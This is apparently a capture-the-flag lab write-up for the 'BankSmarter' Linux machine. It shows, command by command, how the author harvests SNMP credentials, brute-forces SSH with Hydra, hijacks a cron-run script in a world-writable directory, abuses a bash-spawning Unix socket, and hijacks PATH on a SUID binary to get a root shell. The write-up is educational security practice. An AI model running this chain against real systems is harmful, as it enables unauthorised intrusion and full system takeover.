BankSmarter

Hack Smarter challenge: SNMP credentials, a scheduled script in a writable directory, Ronnie's socket, and a path to root.

Scenario

Hack Smarter tasked me with getting into a standalone Linux server and escalating to root.

Not fully satisfied that the results from Rustscan are all we need. Let's run an Nmap that builds in service detection and see if we learn new information:

nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.0.29.84

The results confirm the open port is, in fact, just Port 22. But the list of potentially exploitable vulnerabilities is madness.

This is maybe 1/10th of the results:

Initial access

It looks like we'll be cracking an SSH login.

In a second terminal, let's see if Nmap can detect any UDP ports:

nmap -sU -p- 10.0.29.84

While that runs, back in our OG terminal, we'll run SNMPwalk and see if we can extract any usable information from the MIB:

snmpwalk -c public -v 2c 10.0.29.84

That was almost instantly useful. There are plaintext Admin credentials sitting in one of the first strings returned:

Exposed Credentials:

STRING: "\"Admin Layne.Stanley:<REDACTED>\""

We'll use Hydra to confirm Mr. Layne's SSH credentials (primarily, the username) are accurate. To do so, we'll create a personalized wordlist using combinations of his name and Admin position.

We'll save this list as sl_usernames.txt:

nano sl_usernames.txt

Then CTRL + o to Save, CTRL + x to exit nano.

Now we'll do the same with potential passwords. I can't display the list publicly because, well, I'd like you to learn how to do this the same way I did: healthy curiosity and research. Nothing wrong with having an LLM guide you through the process, either:

nano sl_passwords.txt

As an aside, that UDP scan has not come back yet. I will likely cancel it. I'll give it about 10 more minutes to show me what it's got.

Back to Hydra. We're ready to run it:

hydra -L sl_usernames.txt -P sl_passwords.txt 10.0.29.84 ssh -I

Woo! We have a hit. Successful SSH credential extraction:

Time to SSH our way in:

ssh <username>@10.0.29.84

Type yes when asked, then enter the unearthed password and we're in:

id
whoami
pwd
ls -lah

Alrighty. We have our user flag sitting in front of us. Let's grab it.

cat user.txt

I'm fairly certain the user flag is randomly generated, but some part of my brain is nagging me to find out if it moonlights as an encoded hint.

I'll leave well enough alone for now. On to the root flag.

From Layne to Scott

Our next move is to enumerate the Linux machine and see what we can find. One of the first directories to investigate on a Linux target is the /tmp/ directory.

It did not disappoint:

bank_exports is looking pretty enticing. bank_exports is definitely custom to this environment, and it's owned by scott.weiland with a timestamp right after the machine started up.

We still have a lot of unknowns, and LinPEAS can fill in the gaps. It's unlikely to be on this box, but we can download and run it in our SSH session without installing.

PS: If you're not already in /tmp, cd yourself there first:

curl -fL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod 700 linpeas.sh
./linpeas.sh

Well, change of plans. The target most likely can't reach GitHub. It was worth a shot. Quick confirmation that it cannot reach GitHub:

curl -IL --connect-timeout 5 --max-time 15 https://github.com

Okay. That's confirmed.

We can copy it from our local machine to the SSH session. If you need to install it first, here's how you do that AND copy it to the target:

curl -fL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh layne.stanley@<TARGET_IP>:/tmp/

If you have it, skip the curl and go right for the scp command. Still on your local machine:

Bam. Done.

Back in our SSH session, we'll chmod it and launch LinPEAS from /tmp:

chmod 700 /tmp/linpeas.sh
/tmp/linpeas.sh

I love LinPEAS. It provides extremely useful information, and a lot of it. Under Processes, Crons, Timers, Services and Sockets > Check for vulnerable cron jobs > Services and Service Files, we can spot bank-pty.service:

We now have two investigable paths and a lot to learn about them.

A bit later in the LinPEAS output, we find this:

In Layne's world-writable home directory, LinPEAS found /home/layne.stanley/bankSmarter_backup.sh, also owned by scott.weiland, and /usr/local/bin/bank_backup.py.

Put simply, the backup script sits in a directory controlled by Layne, but owned by Scott. My best assessment is that Scott's scheduled task likely runs and creates bank_exports.

We can hypothesize all day long, but that won't move the needle:

sed -n '1,180p' /home/layne.stanley/bankSmarter_backup.sh

We're looking for mentions the script path of bank_exports in the output.

This script sets EXPORT_DIR="/tmp/bank_exports", confirming a direct connection to the directory. The script then writes to /etc/bank_api_keys, leading me to believe we'll need elevated privileges to run it.

We'll run these three commands to try and connect some dots:

grep -nE 'query_accounts_from_db|bank_exports|bankSmarter_backup' /home/layne.stanley/bankSmarter_backup.sh

systemctl cat bank-pty.service

cat /usr/local/bin/bank_backup.py

Still three separate pieces of the puzzle. bank-pty.service runs /opt/bank/pty_server.py as ronnie.stone.

bank_backup.py prints a demo message. The shell script shows /tmp/bank_exports , yet calls this function, query_accounts_from_db. set -e indicates that the script should stop before it writes a CSV file.

Let's see if files are appearing and who owns them:

ls -l /tmp/bank_exports

Well, bank_exports is empty but that doesn't mean it's useless.

Let's see Layne's cron jobs:

crontab -l

Another nope. Perhaps the system cron directory bears fruit:

ls -l /etc/cron.d

No bank script in /etc/cron.d. Scott owns a script in Layne's home directory, but we still haven't found what launches it.

What Scott's script invokes is another question to answer:

cat /etc/crontab

No bank script in /etc/crontab, either. Scott may be calling it from his personal crontab.

I feel like I ran LinPEAS during a short duration where the bank script running. Let's poll the process list for the scripts name and see if my hunch is accurate:

while true; do ps -eo user,pid,args | grep '[b]ankSmarter_backup'; sleep 0.2; done

It took a while, but we caught it running:

Scott does indeed launch the backup from Layne's writable home directory. LinPEAS detailed a laundry list of available permissions. Before we change the script, let's double check them:

ls -ld /home/layne.stanley

Excellent news. The directory is writable by everyone and has no sticky bit. Even though Scott owns it, Layne can replace anything he wants inside that directory. It may take until the next ice age to run what we put there, but I digress.

Our first step is preserve the original script so we can restore it and make a clean exit once we're done:

cp /home/layne.stanley/bankSmarter_backup.sh /tmp/bankSmarter_backup.original

We'll test the overly permissioned directory with an id record, and if all goes well, we move in for the win.

Run these back to back, then wait about 5 minutes to run the third command:

printf '#!/bin/bash\nid > /tmp/bank_job_identity.txt\n' > /tmp/bank_job_test.sh

mv /tmp/bank_job_test.sh /home/layne.stanley/bankSmarter_backup.sh

After you run the move command, type y when asked:

We don't know the run time between intervals, but let's just see if it's there:

cat /tmp/bank_job_identity.txt

Success. id ran as Scott and with Scott's full group membership. Privilege step is confirmed.

bank-pty.service runs from /opt/bank as Ronnie, and Scott’s bank-team membership might just allow access there. Let's find out:

ls -ld /opt/bank /opt/bank/sockets

Alright then. Layne can't enter /opt/bank, but we proved Scott's scheduled job has this group.

Scott can likely see the socket used by Ronnie’s PTY service. Let's have the scheduled script record a directory listing and see if that's our hook:

printf '#!/bin/bash\nls -la /opt/bank /opt/bank/sockets > /tmp/bank_scott_listing.txt 2>&1\n' > /home/layne.stanley/bankSmarter_backup.sh

Wait a moment for it to run, then:

cat /tmp/bank_scott_listing.txt

From Scott to Ronnie

Very helpful. Ronnie owns live.sock, which is also accessible to bank-team. Scott also belongs to that group, and can also read pty_server.py.

Before we connect to that socket, let's see what it does:

printf '#!/bin/bash\ncat /opt/bank/pty_server.py > /tmp/bank_pty_code.txt 2>&1\n' > /home/layne.stanley/bankSmarter_backup.sh

Wait for its next run, then...

cat /tmp/bank_pty_code.txt

An important find:

pty_server.py listens on live.sock and, for each connection, starts /bin/bash.

Since the script starts /bin/bash for every socket connection, we'll run this command to see if ronnie.stone appears in the saved id output. That allows us to confirm whose privileges that shell has based on the response:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
printf 'id\nexit\n' | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /tmp/bank_socket_identity.txt 2>&1
EOF

Let the scheduled run happen, then:

cat /tmp/bank_socket_identity.txt

At first, I ran the cat command too quickly. I waited a bit longer, and once it was there, no output.

Sending id and exit together probably closed the connection too quickly.

Let's try changing a line in the script that will briefly leave the connection open:

{ printf 'id\n'; sleep 2; printf 'exit\n'; } | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /tmp/bank_socket_identity.txt 2>&1

Well, that didn't work. Layne can't overwrite what Scott writes.

In our writable home directory, a new path should let the scheduled test capture the response:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf 'id\n'; sleep 2; printf 'exit\n'; } | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_socket_identity.txt 2>&1
EOF

Let patience be your virtue (about 2-3 minutes), then run:

cat /home/layne.stanley/bank_socket_identity.txt

It worked. The socket opened a shell as ronnie.stone and membership in the bankers group.

Courtesy of LinPEAS, we know Ronnie has access above and beyond Layne and Scott, and /usr/local/bin/bank_backupd has a root-owned SUID file associated with bankers.

From Ronnie to root

We'll investigate the bank_backupd binary as the next potentially crossable access boundary:

ls -l /usr/local/bin/bank_backupd

It takes its job as a binary seriously.

-rwsr-x--- means it's root-owned, the SUID bit is set, and only root or members of bankers can execute it. Thankfully, we just confirmed that Ronnie is in bankers.

Layne can't read the binary, but its readable strings might reveal which backup command it launches. We have to run this from the Ronnie shell we reached through the socket, which we can do by injecting this command into the scheduled script:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf '%s\n' "strings /usr/local/bin/bank_backupd | grep -iE 'python|backup|system|exec|path'"; sleep 2; printf 'exit\n'; } | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_binary_strings.txt 2>&1
EOF

Wait the 2-3 minutes, then:

cat /home/layne.stanley/bank_binary_strings.txt

Okay. The binary contains python3, /usr/local/bin/bank_backup.py, and execv. It looks like it launches the Python backup script.

Ronnie can execute the SUID binary named in the strings output. Let's see what the binary prints on a normal day when Ronnie runs it. Ideally, it will reference python3 and a backup script:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf '/usr/local/bin/bank_backupd\n'; sleep 3; printf 'exit\n'; } | timeout 8s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_backupd_output.txt 2>&1
EOF

Wait 2-3 minutes again, then:

cat /home/layne.stanley/bank_backupd_output.txt

Successfully ran the bank_backupd binary as Ronnie and started the Python script.

Let's find out whose privileges this replacement Python interpreter will receive. We'll do this by running a stand-in file that records IDs...

cat > /home/layne.stanley/python3 <<'EOF'
#!/bin/sh
/usr/bin/id > /home/layne.stanley/bank_suid_probe.txt
EOF
chmod +x /home/layne.stanley/python3

...and we'll have the scheduled job run the binary through Ronnie’s socket with our home directory listed first in PATH:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 3; printf 'exit\n'; } | timeout 8s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_path_test.txt 2>&1
EOF

Wait 2-3 minutes, then:

cat /home/layne.stanley/bank_suid_probe.txt

Not as dramatic as it seems. The probe file landed, but Layne can't read it. We likely created a restricted file. Let's investigate:

ls -l /home/layne.stanley/bank_suid_probe.txt /home/layne.stanley/bank_path_test.txt

The python3 stand-in probe ran as root:root, hence, why Layne couldn't read it. We know we can change privileges, so let's use that to our advantage.

We'll have the python3 stand-in open a privileged shell and ask it for id by replacing it with:

cat > /home/layne.stanley/python3 <<'EOF'
#!/bin/sh
exec /bin/bash -p
EOF

Now we replace the scheduled script:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 2; printf 'id\n'; sleep 2; printf 'exit\n'; sleep 1; printf 'exit\n'; } | timeout 10s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_root_identity.txt 2>&1
EOF

Another 2-3 minute wait, then:

cat /home/layne.stanley/bank_root_identity.txt

Score. A root prompt and uid=0(root). PrivEsc = achieved.

Let's find that root flag:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 2; printf 'ls -la /root\n'; sleep 2; printf 'exit\n'; sleep 1; printf 'exit\n'; } | timeout 10s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_root_listing.txt 2>&1
EOF

Another 2-3 minutes later:

cat /home/layne.stanley/bank_root_listing.txt

Thanks to the root shell, we can see the root flag.

We'll modify the same command sequence, this time changing ls -la /root to cat /root/root.txt:

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 2; printf 'cat /root/root.txt\n'; sleep 2; printf 'exit\n'; sleep 1; printf 'exit\n'; } | timeout 10s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock > /home/layne.stanley/bank_root_flag.txt 2>&1
EOF

Wait, you guessed it, another 2-3 minutes:

cat /home/layne.stanley/bank_root_flag.txt

We nabbed the root flag.

Cleanup

Now it's cleanup time. We start by stopping the first recurring probe:

cp /tmp/bankSmarter_backup.original /home/layne.stanley/bankSmarter_backup.sh
rm /home/layne.stanley/python3

Eradicate the output files created in the home directory:

rm -f /home/layne.stanley/bank_{socket_identity,binary_strings,backupd_output,path_test,suid_probe,root_identity,root_listing,root_flag}.txt

And confirm the script is back to its previously-unaltered state:

head -n 3 /home/layne.stanley/bankSmarter_backup.sh

#!/usr/bin/env bash and # bank_maintenance.sh = back to normal.

Cue the confetti.
